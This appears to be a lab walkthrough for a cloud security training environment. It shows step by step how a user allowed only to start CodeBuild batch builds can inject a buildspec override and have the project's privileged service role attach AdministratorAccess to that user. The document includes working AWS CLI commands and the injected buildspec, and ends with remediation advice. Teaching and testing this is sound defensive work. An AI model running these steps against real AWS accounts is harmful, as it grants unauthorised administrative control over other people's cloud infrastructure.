# Guided Walkthrough: One-Hop Privilege Escalation via codebuild:StartBuildBatch

This scenario demonstrates a privilege escalation vulnerability where a user has permission to start CodeBuild batch builds using `codebuild:StartBuildBatch`. Unlike PassRole scenarios that require creating new resources, this attack exploits an existing CodeBuild project that already has an attached service role with administrative permissions.

The key vulnerability is that `codebuild:StartBuildBatch` allows the attacker to use the `--buildspec-override` parameter to inject a malicious buildspec. This means they can execute arbitrary commands within the context of the existing project's privileged service role without needing `iam:PassRole` or `codebuild:CreateProject` permissions. The attacker can use this to grant themselves administrative access by having the build attach an AdministratorAccess policy to their own user account.

This is particularly dangerous in environments where CodeBuild projects are created with overly permissive service roles (such as IAM modification permissions) and users are given access to start builds without proper oversight of buildspec overrides.

## The Challenge

You start as `pl-prod-codebuild-003-to-admin-starting-user`, an IAM user with `codebuild:StartBuildBatch` permission. Your credentials are available via Terraform outputs. Somewhere in this AWS account is a CodeBuild project — `pl-prod-codebuild-003-to-admin-target-project` — that has a service role attached with `iam:AttachUserPolicy` permission.

Your goal: use your `StartBuildBatch` permission to inject a malicious buildspec, have it execute under the project's privileged service role, and walk away with `AdministratorAccess` attached to your own user.

## Reconnaissance

First, confirm who you are and verify you don't already have elevated permissions:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-codebuild-003-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — good, you're operating with least-privilege
```

Next, enumerate CodeBuild projects to confirm the target exists and identify what service role is attached:

```bash
aws codebuild list-projects
# Should show pl-prod-codebuild-003-to-admin-target-project

aws codebuild batch-get-projects --names pl-prod-codebuild-003-to-admin-target-project \
  --query 'projects[0].serviceRole' --output text
# arn:aws:iam::<account_id>:role/pl-prod-codebuild-003-to-admin-target-role
```

You now know the target project exists and has a service role attached. The critical question is: what can that role do? In a real engagement you'd enumerate the role's policies. In this scenario, the role has `iam:AttachUserPolicy` — enough to grant you admin.

## Exploitation

The attack hinges on the fact that `codebuild:StartBuildBatch` accepts a `--buildspec-override` parameter. CodeBuild executes the build under the project's attached service role, so whatever commands you inject run with that role's permissions — no `iam:PassRole` required on your end.

Craft a malicious buildspec file at `/tmp/malicious-buildspec.yml`:

```yaml
version: 0.2
batch:
  fast-fail: false
  build-list:
    - identifier: privesc_build
      buildspec: |
        version: 0.2
        phases:
          build:
            commands:
              - echo "Starting privilege escalation..."
              - aws iam attach-user-policy --user-name pl-prod-codebuild-003-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
              - echo "Successfully attached AdministratorAccess policy"
```

Now fire the batch build with your override:

```bash
aws codebuild start-build-batch \
  --project-name pl-prod-codebuild-003-to-admin-target-project \
  --buildspec-override file:///tmp/malicious-buildspec.yml \
  --output json
```

Note the `id` from the response — you'll use it to monitor progress. CodeBuild batch builds take 2–3 minutes to complete due to batch orchestration overhead. Poll the status until it reaches `SUCCEEDED`:

```bash
aws codebuild batch-get-build-batches \
  --ids <batch-build-id> \
  --query 'buildBatches[0].buildBatchStatus' \
  --output text
```

Once you see `SUCCEEDED`, wait an additional 15 seconds for IAM policy propagation.

## Verification

With the build complete and IAM changes propagated, confirm you now have administrative access:

```bash
aws iam list-users --max-items 3 --output table
```

If the table renders cleanly, the `AdministratorAccess` managed policy has been attached to your user and you have full IAM read access — the privilege escalation worked.

## What Happened

You exploited a subtle but powerful trust relationship: the CodeBuild project's service role is assumed automatically during any build, including ones triggered with a buildspec override. Because the project already existed with a privileged role attached, you needed only `codebuild:StartBuildBatch` — no `iam:PassRole`, no `codebuild:CreateProject`. The injected buildspec ran as `pl-prod-codebuild-003-to-admin-target-role`, which had `iam:AttachUserPolicy`, and used that permission to elevate your starting user to full administrator.

In production environments, this class of vulnerability appears whenever development teams grant broad `codebuild:StartBuildBatch` (or `StartBuild`) permissions without restricting which projects can be targeted, and those projects carry service roles with IAM modification capabilities. A proper fix requires both scoping down the `StartBuildBatch` permission to specific project ARNs and ensuring CodeBuild service roles follow least privilege.
